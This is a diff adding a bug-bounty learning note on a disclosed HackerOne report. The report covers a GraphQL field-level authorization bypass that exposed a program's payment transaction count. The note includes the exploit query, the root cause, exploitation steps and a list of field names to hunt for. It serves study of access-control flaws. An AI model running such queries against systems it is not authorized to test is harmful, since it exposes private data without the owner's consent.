@@ -425,3 +425,150 @@ Always test:
 "Can I access another user's object by changing only the identifier?"
 
 </details>
+
+---
+
+<details>
+<summary><b>🟡 GraphQL Field-Level Authorization Bypass Leading to Information Disclosure</b></summary>
+
+<br>
+
+**Source:** [HackerOne Report #707433](https://hackerone.com/reports/707433)
+
+---
+
+## 🐞 Vulnerability
+
+A GraphQL query exposed the `payment_transactions` field of programs to unauthorized users.
+
+The field contained information that should only be accessible by program team members, but external users could query it directly.
+
+Example:
+
+```graphql
+query Team_mini_profile {
+  team(handle:"program") {
+    id
+    name
+    payment_transactions {
+      total_count
+    }
+  }
+}
+```
+
+Response:
+
+```json
+{
+  "payment_transactions": {
+    "total_count": 9
+  }
+}
+```
+
+---
+
+## 🔍 Root Cause
+
+Missing field-level authorization.
+
+The application protected access to sensitive data incorrectly.
+
+The `team` object was publicly accessible, but sensitive fields inside the object were not restricted.
+
+Example:
+
+```
+Team
+ |
+ |-- name ✅ public
+ |
+ |-- about ✅ public
+ |
+ |-- payment_transactions ❌ should be restricted
+```
+
+The server checked:
+
+```
+Can user access Team?
+```
+
+but failed to check:
+
+```
+Can user access payment_transactions?
+```
+
+---
+
+## ⚔️ Exploitation
+
+1. Find public GraphQL objects.
+2. Inspect available fields.
+3. Add sensitive fields manually.
+4. Check if restricted information is returned.
+
+Example:
+
+Normal query:
+
+```graphql
+team(handle:"program"){
+    name
+}
+```
+
+Modified query:
+
+```graphql
+team(handle:"program"){
+    name
+    payment_transactions{
+        total_count
+    }
+}
+```
+
+---
+
+## 🎯 Impact
+
+Unauthorized users could obtain private program information:
+
+- Payment transaction count
+- Information about program activity
+
+The exposed field could also reveal whether a program was involved in private activity.
+
+---
+
+## 🎯 Hunting Strategy
+
+Look for sensitive GraphQL fields:
+
+```
+payment
+billing
+transactions
+members
+emails
+private
+internal
+admin
+permissions
+```
+
+Test:
+
+- Public objects with hidden fields
+- Fields requiring higher privileges
+- GraphQL queries from frontend applications
+- Fields accessible without authentication
+
+Main question:
+
+"Can I access this field even though I cannot access this type of information normally?"
+
+</details>
